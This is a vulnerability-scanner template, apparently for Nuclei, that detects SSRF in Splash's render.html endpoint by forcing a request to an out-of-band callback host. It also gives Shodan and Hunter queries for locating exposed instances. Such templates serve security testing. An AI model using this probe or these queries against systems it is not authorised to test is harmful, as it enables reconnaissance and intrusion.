id: splash-render-ssrf

info:
  name: Splash Render SSRF
  author: pwnhxl
  severity: high
  reference:
    - https://github.com/scrapinghub/splash
    - https://b1ngz.github.io/splash-ssrf-to-get-server-root-privilege/
  metadata:
    verified: "true"
    shodan-query: title:"Splash"
    hunter-query: web.title="Splash" && header="TwistedWeb"
  tags: splash,ssrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/render.html?url=http://{{interactsh-url}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: status
        status:
          - 200
